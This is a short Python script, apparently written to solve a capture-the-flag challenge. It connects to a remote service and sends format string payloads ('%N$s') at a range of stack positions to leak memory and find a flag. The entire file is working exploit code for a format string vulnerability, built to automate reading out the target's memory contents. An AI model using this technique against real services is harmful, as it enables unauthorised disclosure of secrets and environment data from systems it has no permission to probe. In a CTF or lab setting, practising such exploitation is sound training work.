#!/usr/bin/env python3
"""
Quick FLAG search using format string vulnerability
"""

import socket

HOST = "timebomb-dc33.hexnova.quest"
PORT = 9999

def send_payload(payload):
    """Send payload and get response quickly"""
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((HOST, PORT))
    s.send(payload.encode() + b'\n')
    
    response = b""
    s.settimeout(2)
    try:
        while True:
            chunk = s.recv(1024)
            if not chunk:
                break
            response += chunk
    except socket.timeout:
        pass
    
    s.close()
    return response.decode('utf-8', errors='ignore')

def quick_flag_search():
    """Quick search for FLAG in environment"""
    print("=== Quick FLAG Search ===")
    
    # Test common positions where environment variables might be
    test_positions = [1, 2, 3, 5, 6, 7, 8, 9, 10, 15, 20, 25, 30]
    
    for pos in test_positions:
        payload = f"%{pos}$s"
        response = send_payload(payload)
        
        if "Enter your OVERRIDE CODE:" in response:
            result = response.split("Enter your OVERRIDE CODE: ")[1].split("\n")[0].strip()
            
            print(f"Pos {pos:2d}: {result[:80]}")
            
            # Check for flag
            if "FLAG" in result or "HEX{" in result or "NOVA{" in result:
                print(f"*** POTENTIAL FLAG: {result}")
                return result
    
    return None

if __name__ == "__main__":
    flag = quick_flag_search()
    if flag:
        print(f"\nFLAG FOUND: {flag}")
    else:
        print("\nNo flag found in quick search")